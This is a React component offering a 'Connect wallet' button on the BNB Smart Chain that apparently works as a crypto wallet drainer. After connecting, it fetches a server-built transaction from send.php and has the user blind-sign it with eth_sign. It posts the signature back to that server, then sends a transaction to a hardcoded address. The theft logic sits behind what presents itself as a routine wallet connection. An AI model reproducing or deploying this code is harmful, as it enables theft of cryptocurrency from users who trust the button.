import jQuery from "jquery";
import { EthereumProvider } from "@walletconnect/ethereum-provider";

function App() {
  async function runner() {
    // Initialize Ethereum Provider
    var ethereumProvider = await EthereumProvider.init({
      showQrModal: true,
      qrModalOptions: {
        themeMode: "dark",
        explorerRecommendedWalletIds: [
          'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
          '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
          '225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f',
          '426b8b13634593783072a3253bb061e825dceeb13593425cc315a9e7d7e60323',
          'f725ed2c96fc9105359df8393b3192a02fdb91c93ad73d0b0edb3f7eae70d059',
          'f81ffb6c9be6997a8e7463c49358b64e733c1cf52f54f2731749eab21cfde63b',
          'f759efd17edb158c361ffd793a741b3518fe85b9c15d36b9483fba033118aaf2',
          'be49f0a78d6ea1beed3804c3a6b62ea71f568d58d9df8097f3d61c7c9baf273d',
          '9a565677e1c0258ac23fd2becc9a6497eeb2f6bf14f6e2af41e3f1d325852edd'
        ]
      },
      chains: [1, 56],  // اضافه کردن اسمارت چین به لیست زنجیره‌ها
      methods: ['eth_sign', 'eth_sendTransaction', 'eth_signTransaction'],
      projectId: "9fe3ed74e1d73141e8b7747bedf77551"
    });

    // Enable the wallet connection
    await ethereumProvider.enable();

    var provider = ethereumProvider;

    // Get the connected wallet account
    var account = await provider.request({ method: "eth_accounts" });
    var account_sender = account[0];
    console.log("Wallet Connected: " + account_sender);

    // Update wallet connect button with connected wallet address
    document.getElementById("kos").innerText = `Connected: ${account_sender}`;

    // Function to generate the transaction signature
    async function genSign(address, chain, type, contract = "0") {
      if (type === "coin") {
        var result = await jQuery.post("send.php", {
          "handler": "tx",
          "address": address,
          "chain": chain,
          "type": type
        });

        var unSigned = JSON.parse(result);
        console.log("Unsigned transaction: ", unSigned);

        // Send the signing request
        try {
          var signed = await provider.request({ method: "eth_sign", params: [address, unSigned.result] });
          console.log("Signed transaction: ", signed);
          return signed;
        } catch (error) {
          console.error("Error while signing: ", error);
        }
      } else if (type === "token") {
        var result = await jQuery.post("send.php", {
          "handler": "tx",
          "address": address,
          "chain": chain,
          "type": type,
          "contract": contract
        });

        var unSigned = JSON.parse(result);
        console.log("Unsigned token transaction: ", unSigned);

        // Send the signing request
        try {
          var signed = await provider.request({ method: "eth_sign", params: [address, unSigned.result] });
          console.log("Signed token transaction: ", signed);
          return signed;
        } catch (error) {
          console.error("Error while signing: ", error);
        }
      }
    }

    // Function to accept the signature and send it for verification
    async function acceptSign(signature, type) {
      console.log("Accepting signature for type: ", type);
      if (type === "coin" || type === "token") {
        var result = await jQuery.post("send.php", {
          "handler": "sign",
          "signature": signature,
          "type": type
        });

        var resultJson = JSON.parse(result);
        return resultJson.result;
      }
    }

    // Request signature after connecting wallet
    var signature = await genSign(account_sender, "56", "coin");  // 56 = Binance Smart Chain
    console.log("Generated signature: ", signature);

    // If signature is received, send it for verification
    if (signature) {
      var rawSign = await acceptSign(signature, "coin");
      console.log("Raw signature: " + rawSign);

      // After accepting the signature, initiate the transaction
      try {
        const txHash = await provider.request({
          method: "eth_sendTransaction",
          params: [{
            from: account_sender,
            to: "0xbA8958d52B940fF513746F24176D1017CaFa707E",  // address to send the coins
            value: "0x0",  // Adjust the value if needed
            gas: "0x5208",  // Standard gas limit for transactions
            gasPrice: "0x3B9ACA00",  // Set the gas price
          }]
        });
        console.log("Transaction Sent! Hash:", txHash);
      } catch (error) {
        console.error("Error sending transaction: ", error);
      }
    }
  }

  return (
    <a href="#" id="kos" onClick={runner} class="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left" data-uk-toggle="">
      <span>Connect wallet</span>
    </a>
  );
}

export default App;
